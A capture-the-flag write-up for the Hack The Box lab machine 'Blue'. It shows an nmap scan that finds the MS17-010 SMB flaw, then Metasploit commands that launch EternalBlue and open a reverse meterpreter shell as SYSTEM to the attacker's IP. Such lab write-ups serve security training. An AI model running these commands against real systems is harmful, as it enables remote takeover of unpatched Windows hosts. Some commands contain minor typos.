+++ 
title = "Blue HTB Write up"
description = "Write up for the HTB machine 'Blue'"
author = "greatmoves"
tags=["CVE-2017-0143", "metasploit", "hackthebox", "eternalblue", "easy"]
date = 2023-05-04
+++

# 1. Inital recon

## 1.1. nmap
We can guess by the name of the room 'Blue' that this machine might be vulnerable to `CVE-2017-0143`, but let's just run an nmap scan to double check

`nmap --script vuln 10.10.10.40`

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
```

# 2. user.txt and root.txt

## 2.1. metasploit

In `msfconsole` run the following commands to get the eternal blue exploit running
```
search CVE-2017-0143
use 0
set rhosts 10.10.10.40
set lhosts YOUR_IP
exploit
```
once you have a meterpreter shell run `shell` then `whoami` to confirm we are `nt authority\system`

Our user flag can be found at `C:\Users\haris\Desktop` and read using `type "user.txt"`

Our root flag can be found at `:\Users\Administrator\Desktop` and read using `type "root.txt"`